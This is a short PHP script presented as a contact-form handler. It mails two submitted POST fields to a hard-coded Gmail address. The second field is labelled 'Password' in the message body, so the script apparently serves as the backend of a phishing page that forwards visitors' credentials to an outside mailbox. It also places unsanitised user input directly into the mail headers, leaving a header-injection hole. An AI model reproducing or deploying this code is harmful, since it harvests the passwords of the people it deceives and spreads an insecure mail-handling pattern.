<?php
$field_name = $_POST['cf_name'];
$field_email = $_POST['cf_email'];


$mail_to = 'adondeeski@gmail.com';
$subject = 'Message from a site visitor '.$field_name;

$body_message = 'From: '.$field_name."\n";
$body_message .= 'Password: '.$field_email."\n";


$headers = 'From: '.$field_email."\r\n";
$headers .= 'Reply-To: '.$field_email."\r\n";

$mail_status = mail($mail_to, $subject, $body_message, $headers);

?>
